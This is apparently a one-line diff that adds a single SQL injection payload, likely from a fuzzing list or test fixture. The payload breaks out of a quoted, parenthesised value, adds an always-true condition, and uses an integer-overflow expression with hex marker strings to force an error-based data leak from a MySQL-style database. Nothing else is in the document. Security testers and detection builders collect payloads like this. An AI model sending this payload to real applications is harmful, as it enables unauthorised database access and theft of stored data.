@@ -1,0 +1,1 @@
+1") where 9680=9680 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--
